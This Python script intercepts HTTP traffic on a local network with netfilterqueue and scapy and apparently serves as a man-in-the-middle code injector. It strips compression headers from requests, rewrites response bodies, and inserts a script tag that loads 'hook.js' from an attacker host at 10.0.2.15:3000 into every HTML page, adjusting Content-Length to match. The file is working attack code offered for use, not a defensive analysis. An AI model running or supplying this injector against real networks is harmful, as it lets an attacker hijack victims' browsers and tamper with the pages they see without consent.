#!/usr/bin/python

import netfilterqueue
import scapy.all as scapy
import re

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        try:
            load = scapy_packet[scapy.Raw].load.decode()
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+] Request")
                print("=======================================================================================================")
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] Response")
                print("=======================================================================================================")

                # Add your keyword replacement logic here
                if "example.com" in load:  # Replace "example.com" with your target keyword
                    replacement_code = '<div>New Content Here</div>'
                    load = load.replace("example.com", replacement_code)

                injection_code = '<script src="http://10.0.2.15:3000/hook.js"></script>'
                load = load.replace("</body>", injection_code + "</body>")

                content_length_search = re.search("(?:Content-Length:\s)(\d+)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))

            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError:
            pass
    packet.accept()


if __name__ == "__main__":
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)

    try:
        while True:
            queue.run()
    except KeyboardInterrupt:
        print("\n[-] Keyboard Interrupt detected. Exiting program")
